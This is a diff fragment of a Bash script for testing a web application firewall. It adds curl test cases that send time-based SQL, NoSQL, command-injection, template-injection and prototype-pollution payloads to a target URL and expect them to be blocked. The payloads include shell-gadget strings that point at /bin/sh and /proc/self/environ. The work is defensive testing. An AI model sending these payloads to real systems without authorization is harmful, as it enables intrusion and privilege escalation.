+    test_curl "SQLi Time: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1'; WAITFOR DELAY '0:0:5'--"
+    test_curl "SQLi Time: BENCHMARK" "block" -A "$UA" -Lk "${URL}?id=1' AND BENCHMARK(5000000,SHA1('test'))--"
+    test_curl "SQLi Time: pg_sleep" "block" -A "$UA" -Lk "${URL}?id=1'; SELECT pg_sleep(5)--"
+    test_curl "SQLi Time: DBMS_LOCK.SLEEP" "block" -A "$UA" -Lk "${URL}?id=1' AND DBMS_LOCK.SLEEP(5)--"
+    test_curl "SQLi Time: IF conditional" "block" -A "$UA" -Lk "${URL}?id=1' AND IF(1=1,SLEEP(5),0)--"
+    test_curl "SQLi Time: CASE WHEN" "block" -A "$UA" -Lk "${URL}?id=1' AND (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--"
+    
+    print_subsection "NoSQL Time-based Blind"
+    test_curl "NoSQL Time: \$where sleep" "block" -A "$UA" -Lk "${URL}?\$where=sleep(5000)"
+    test_curl "NoSQL Time: function sleep" "block" -A "$UA" -Lk "${URL}?query={\"\\$where\":\"sleep(5000)\"}"
+    
+    print_subsection "Command Injection Time-based"
+    test_curl "CMDi Time: ;sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=test;sleep 5"
+    test_curl "CMDi Time: |sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=test|sleep 5"
+    test_curl "CMDi Time: \`sleep 5\`" "block" -A "$UA" -Lk "${URL}?cmd=\`sleep 5\`"
+    test_curl "CMDi Time: \$(sleep 5)" "block" -A "$UA" -Lk "${URL}?cmd=\$(sleep 5)"
+    test_curl "CMDi Time: ping -c 5" "block" -A "$UA" -Lk "${URL}?cmd=;ping -c 5 127.0.0.1"
+    
+    print_subsection "SSTI Time-based"
+    test_curl "SSTI Time: {{range(1,9999999)}}" "block" -A "$UA" -Lk "${URL}?template={{range(1,9999999)}}"
+    test_curl "SSTI Time: {%for%} loop" "block" -A "$UA" -Lk "${URL}?template={%for i in range(99999999)%}a{%endfor%}"
+}
+
+#==============================================================================
+# PROTOTYPE POLLUTION TESTS
+#==============================================================================
+test_prototype_pollution() {
+    print_section "🧬 TESTES DE PROTOTYPE POLLUTION (20 testes)" "-c prototype"
+    
+    print_subsection "JSON Body Prototype Pollution"
+    test_curl "Proto: __proto__.admin" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"__proto__":{"admin":true}}' "$URL"
+    test_curl "Proto: __proto__.isAdmin" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}' "$URL"
+    test_curl "Proto: constructor.prototype" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"admin":true}}}' "$URL"
+    test_curl "Proto: nested __proto__" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"user":{"__proto__":{"role":"admin"}}}' "$URL"
+    
+    print_subsection "Query String Prototype Pollution"
+    test_curl "Proto: ?__proto__[admin]=1" "block" -A "$UA" -Lk "${URL}?__proto__[admin]=1"
+    test_curl "Proto: ?__proto__.admin=1" "block" -A "$UA" -Lk "${URL}?__proto__.admin=1"
+    test_curl "Proto: ?constructor[prototype][admin]" "block" -A "$UA" -Lk "${URL}?constructor[prototype][admin]=1"
+    test_curl "Proto: ?a[__proto__][b]=1" "block" -A "$UA" -Lk "${URL}?a[__proto__][b]=1"
+    
+    print_subsection "Common Gadgets"
+    test_curl "Proto: shell gadget" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}' "$URL"
+    test_curl "Proto: env gadget" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"__proto__":{"env":{"EVIL":"true"}}}' "$URL"
+    test_curl "Proto: argv gadget" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"__proto__":{"argv0":"node","shell":"/bin/sh"}}' "$URL"
+    
+    print_subsection "Encoded Prototype Pollution"
+    test_curl "Proto: URL encoded" "block" -A "$UA" -Lk "${URL}?__%70roto__%5Badmin%5D=1"
+    test_curl "Proto: Double encoded" "block" -A "$UA" -Lk "${URL}?%5F%5Fproto%5F%5F%5Badmin%5D=1"
+    test_curl "Proto: Unicode" "block" -A "$UA" -Lk "${URL}?__proto\u005f\u005f[admin]=1"
+}
 
 #==============================================================================
 # RESUMO FINAL
@@ -3445,7 +3826,8 @@ while [[ $# -gt 0 ]]; do
             echo "  contamination, responsesmuggling, h2c, ssi, cdn, xslt, waf,"
             echo "  ports, ssl, useragent, referer, fakebots, 403bypass,"
             echo "  clickjacking, secheaders, session, css, email, credentials,"
-            echo "  enumeration, formatstring, csrf"
+            echo "  enumeration, formatstring, csrf, jwt, nosql, ldap, xpath,"
+            echo "  deser, upload, redirect, idor, timebased, prototype"
             exit 0 
             ;;
         -v|--verbose) VERBOSE=true; shift ;;
@@ -3527,6 +3909,16 @@ case $CATEGORY in
     enumeration|userenum|accountenum) test_account_enumeration ;;
     formatstring|printf) test_format_string ;;
     csrf|xsrf) test_csrf_protection ;;
+    jwt|jwtattack|token) test_jwt_attacks ;;
+    nosql|mongodb|nosqlinjection) test_nosql_injection ;;
+    ldap|ldapinjection) test_ldap_injection ;;
+    xpath|xpathinjection) test_xpath_injection ;;
+    deser|deserialization|unserialize) test_deserialization ;;
+    upload|fileupload|uploadbypass) test_file_upload ;;
+    redirect|openredirect|urlredirect) test_open_redirect ;;
+    idor|privesc|privilege) test_idor_priv_esc ;;
+    timebased|blind|timeblind) test_time_based_injection ;;
+    prototype|protopollution|__proto__) test_prototype_pollution ;;
     all)
         test_all_http_methods
         test_malicious_cookies
@@ -3568,6 +3960,16 @@ case $CATEGORY in
         test_account_enumeration
         test_format_string
         test_csrf_protection
+        test_jwt_attacks
+        test_nosql_injection
+        test_ldap_injection
+        test_xpath_injection
+        test_deserialization
+        test_file_upload
+        test_open_redirect
+        test_idor_priv_esc
+        test_time_based_injection
+        test_prototype_pollution
         test_bad_user_agents
         test_bad_referers
         test_good_bots
